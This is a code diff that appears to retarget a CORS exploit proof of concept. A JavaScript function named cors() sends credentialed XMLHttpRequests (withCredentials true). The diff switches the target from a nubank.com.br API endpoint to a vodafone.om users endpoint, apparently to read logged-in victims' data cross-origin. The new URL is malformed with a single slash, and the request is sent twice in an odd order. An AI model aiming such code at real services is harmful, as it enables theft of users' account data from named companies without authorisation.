@@ -38,7 +38,7 @@
     function cors(){
         var xhttp = new XMLHttpRequest();
 
-    xhttp.open("POST", "https://backend.blog.nubank.com.br/wp-json/", true);
+    xhttp.open("GET", "https:/vodafone.om/api/backend/ajax/v1/users", true);
     xhttp.setRequestHeader("Content-type", "application/json"); // Set appropriate headers if needed
     xhttp.send();
         xhttp.onreadystatechange = function(){
@@ -52,7 +52,7 @@
           
 
         };
-        xhttp.open("POST","https://backend.blog.nubank.com.br/wp-json/",true);
+        xhttp.open("GET","https:/vodafone.om/api/backend/ajax/v1/users",true);
         xhttp.withCredentials = true;
         xhttp.send();
     }
